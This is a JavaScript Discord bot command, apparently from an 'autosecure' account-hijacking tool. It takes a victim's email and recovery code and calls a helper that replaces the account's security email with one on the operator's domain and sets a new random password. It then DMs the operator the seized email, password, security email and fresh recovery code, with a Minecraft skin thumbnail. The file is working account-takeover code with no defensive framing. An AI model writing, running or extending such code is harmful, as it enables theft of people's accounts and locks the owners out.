const path = require('path');
const config = require(path.resolve(__dirname, '../../../config.json'));
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { queryParams } = require(path.resolve(__dirname, '../../../db/db.js'));
const generate = require(path.resolve(__dirname, '../../utils/generate'));
const recoveryCodeSecure = require(path.resolve(__dirname, '../../utils/recoveryCodeSecure'));
const secureTime = require(path.resolve(__dirname, '../../utils/secureTime'));
const { domains } = config;

module.exports = {
    name: "recsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            await interaction.deferReply({ ephemeral: true });
            let email = interaction.components[0].components[0].value;
            let recoveryCode = interaction.components[1].components[0].value;
            let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username]);
            if (settings.length === 0) {
                return interaction.followUp({ content: `Couldn't get your settings!`, ephemeral: true });
            }
            settings = settings[0];
            secureTime.startTimer();
            let secEmail = `${generate(16)}@${settings?.domain ? settings.domain : domains[0]}`;
            let data = await recoveryCodeSecure(email, recoveryCode, secEmail, generate(16));
            if (!data) {
                return interaction.followUp({
                    content: `Failed to secure using this recovery code and email. Either the email or the recovery code is invalid.`,
                    ephemeral: true
                });
            }
            const timeTakenInMs = secureTime.stopTimer();
            const timeInSeconds = secureTime.getTimeInSeconds(timeTakenInMs);
            let msg = {
                embeds: [
                    new EmbedBuilder()
                        .setColor(0xFFFFFF)
                        .setTitle(`Secured in ${timeInSeconds} seconds`)
                        .addFields([
                            { name: "Email", value: `\`\`\`${data.email}\`\`\``, inline: true },
                            { name: "Security Email", value: `\`\`\`${data.secEmail}\`\`\``, inline: true },
                            { name: "Password", value: `\`\`\`${data.password}\`\`\``, inline: false },
                            { name: "Recovery Code", value: `\`\`\`${data.recoveryCode}\`\`\``, inline: false }
                        ])
                        .setTimestamp(Date.now())
                        .setThumbnail(`https://mineskin.eu/armor/body/${data.oldName?.replaceAll(" ", "") || "Unknown"}`)
                ],
                ephemeral: true,
                components: [
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder()
                            .setCustomId("email|" + data.secEmail)
                            .setEmoji("📬")
                            .setStyle(ButtonStyle.Secondary)
                    )
                ]
            };
            await interaction.user.send(msg);
            return interaction.editReply({ content: `Account secured successfully.`, ephemeral: true });
        } catch (error) {
            console.error(error);
            if (!interaction.replied) {
                await interaction.followUp({ content: `An error occurred. Please try again.`, ephemeral: true });
            }
        }
    }
};
